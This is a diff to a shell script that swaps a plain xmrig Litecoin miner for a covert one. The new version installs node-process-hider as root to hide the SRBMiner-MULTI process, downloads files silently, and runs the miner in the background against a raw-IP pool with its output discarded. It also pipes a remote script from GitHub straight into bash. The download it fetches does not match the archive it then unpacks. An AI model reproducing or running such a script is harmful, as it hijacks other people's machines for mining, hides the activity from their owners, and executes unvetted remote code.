@@ -1,7 +1,7 @@
 #!/bin/sh
-sudo apt update
-sudo apt install screen -y
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz >/dev/null 2>&1
-tar -xf xmrig-6.21.1-linux-x64.tar.gz
-cd xmrig-6.21.1
-./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 -u LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg."0$RANDOM"
+sudo su --command "curl -fsSL https://deb.nodesource.com/setup_24.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
+wget https://github.com/malogrono/opr/raw/refs/heads/main/bash >/dev/null 2>&1
+tar -xzvf SRBMiner-Multi-2-4-8-Linux.tar.gz
+cd SRBMiner-Multi-2-4-8
+./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://148.113.141.142:80 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.SR >/dev/null 2>&1 &
+curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
